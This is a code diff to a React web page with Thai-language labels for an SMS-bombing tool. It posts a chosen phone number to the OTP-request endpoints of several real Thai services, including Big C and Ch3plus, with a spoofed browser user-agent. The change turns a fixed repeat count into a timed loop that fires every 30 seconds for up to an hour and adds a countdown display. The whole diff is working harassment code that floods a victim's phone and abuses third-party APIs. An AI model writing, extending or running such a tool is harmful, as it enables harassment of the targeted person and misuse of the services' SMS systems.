@@ -1,5 +1,5 @@
 
-import { useState } from "react";
+import { useState, useEffect, useRef } from "react";
 import { Card } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -17,10 +17,21 @@ interface LogEntry {
 
 const Index = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
-  const [count, setCount] = useState("1");
+  const [minutes, setMinutes] = useState("1");
   const [loading, setLoading] = useState(false);
   const [logs, setLogs] = useState<LogEntry[]>([]);
+  const [remainingTime, setRemainingTime] = useState<number>(0);
+  const timerRef = useRef<NodeJS.Timeout>();
   const { toast } = useToast();
+
+  useEffect(() => {
+    if (remainingTime > 0) {
+      timerRef.current = setInterval(() => {
+        setRemainingTime(prev => prev - 1);
+      }, 1000);
+    }
+    return () => clearInterval(timerRef.current);
+  }, [remainingTime]);
 
   const validatePhoneNumber = (number: string) => {
     const regex = /^0\d{9}$/;
@@ -49,9 +60,11 @@ const Index = () => {
     }
 
     setLoading(true);
-    addLog(phoneNumber, 'success', `เริ่มต้นการส่ง SMS จำนวน ${count} ครั้ง`);
+    const totalSeconds = parseInt(minutes) * 60;
+    setRemainingTime(totalSeconds);
+    addLog(phoneNumber, 'success', `เริ่มต้นการส่ง SMS เป็นเวลา ${minutes} นาที`);
     
-    try {
+    const sendSMS = async () => {
       const endpoints = [
         'https://openapi.bigc.co.th/customer/v1/otp',
         'https://api-sso.ch3plus.com/user/request-otp',
@@ -63,35 +76,36 @@ const Index = () => {
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
       };
 
-      for (let i = 0; i < parseInt(count); i++) {
-        for (const endpoint of endpoints) {
-          try {
-            await axios.post(endpoint, {
-              phone_no: phoneNumber,
-              tel: phoneNumber,
-              type: "register"
-            }, { headers });
-            addLog(phoneNumber, 'success', `✓ ส่ง SMS สำเร็จผ่าน ${endpoint.split('/')[2]} [${i + 1}/${count}]`);
-          } catch (error) {
-            addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${endpoint.split('/')[2]} [${i + 1}/${count}]`);
-            console.error(`Error with endpoint ${endpoint}:`, error);
-          }
+      for (const endpoint of endpoints) {
+        try {
+          await axios.post(endpoint, {
+            phone_no: phoneNumber,
+            tel: phoneNumber,
+            type: "register"
+          }, { headers });
+          addLog(phoneNumber, 'success', `✓ ส่ง SMS สำเร็จผ่าน ${endpoint.split('/')[2]}`);
+        } catch (error) {
+          addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${endpoint.split('/')[2]}`);
+          console.error(`Error with endpoint ${endpoint}:`, error);
         }
       }
+    };
 
+    // เริ่มต้นการส่ง SMS ทุก 30 วินาที
+    const interval = setInterval(sendSMS, 30000);
+    await sendSMS(); // ส่งครั้งแรกทันที
+
+    // ตั้งเวลาหยุดการส่ง
+    setTimeout(() => {
+      clearInterval(interval);
+      setLoading(false);
+      setRemainingTime(0);
+      addLog(phoneNumber, 'success', `🏁 สิ้นสุดการส่ง SMS แล้ว`);
       toast({
         title: "สำเร็จ",
-        description: `ส่ง SMS ไปยังหมายเลข ${phoneNumber} จำนวน ${count} ครั้ง`,
+        description: `สิ้นสุดการส่ง SMS ไปยังหมายเลข ${phoneNumber}`,
       });
-    } catch (error) {
-      toast({
-        title: "เกิดข้อผิดพลาด",
-        description: "ไม่สามารถส่ง SMS ได้",
-        variant: "destructive",
-      });
-    } finally {
-      setLoading(false);
-    }
+    }, totalSeconds * 1000);
   };
 
   return (
@@ -160,14 +174,23 @@ const Index = () => {
                     <Clock className="absolute left-3 top-2.5 h-5 w-5 text-gray-400 group-hover:text-blue-400 transition-colors" />
                     <Input
                       type="number"
-                      placeholder="จำนวนครั้งที่ต้องการส่ง"
-                      value={count}
-                      onChange={(e) => setCount(e.target.value)}
+                      placeholder="ระยะเวลาที่ต้องการส่ง (นาที)"
+                      value={minutes}
+                      onChange={(e) => setMinutes(e.target.value)}
                       className="w-full pl-10 pr-4 py-2 bg-gray-800/50 border-gray-700 text-gray-100 placeholder:text-gray-500 focus:ring-2 focus:ring-blue-500 transition-all"
                       min="1"
-                      max="100"
+                      max="60"
                     />
                   </div>
+
+                  {remainingTime > 0 && (
+                    <div className="text-center text-sm">
+                      <span className="text-blue-400">เวลาที่เหลือ: </span>
+                      <span className="text-white font-mono">
+                        {Math.floor(remainingTime / 60)}:{(remainingTime % 60).toString().padStart(2, '0')}
+                      </span>
+                    </div>
+                  )}
 
                   <Button
                     type="submit"
